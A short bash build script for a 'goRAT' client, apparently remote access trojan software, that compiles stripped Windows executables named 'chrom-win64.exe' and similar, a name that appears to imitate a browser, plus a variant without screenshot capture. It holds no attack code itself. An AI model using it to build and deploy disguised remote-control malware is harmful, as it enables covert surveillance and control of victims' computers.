#!/bin/bash
# Windows Build Script for goRAT Client

set -e

echo "Building Windows clients..."

# Debug builds (with symbols and no optimization)
echo "Building debug versions..."
GOOS=windows GOARCH=amd64 go build -gcflags="all=-N -l" -o bin/chrom-win64-debug.exe ./cmd/client
GOOS=windows GOARCH=386 go build -gcflags="all=-N -l" -o bin/chrom-win32-debug.exe ./cmd/client

# Release builds (optimized, stripped)
echo "Building release versions..."
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o bin/chrom-win64.exe ./cmd/client
GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o bin/chrom-win32.exe ./cmd/client

# No-screenshot builds (lighter)
echo "Building no-screenshot versions..."
GOOS=windows GOARCH=amd64 go build -tags noscreenshot -ldflags="-s -w" -o bin/chrom-win64-noscreenshot.exe ./cmd/client

echo ""
echo "Build complete! Files created:"
ls -lh bin/chrom-win*.exe

echo ""
echo "Debug versions (for troubleshooting):"
echo "  - bin/chrom-win64-debug.exe"
echo "  - bin/chrom-win32-debug.exe"
echo ""
echo "Release versions (for deployment):"
echo "  - bin/chrom-win64.exe"
echo "  - bin/chrom-win32.exe"
echo "  - bin/chrom-win64-noscreenshot.exe"
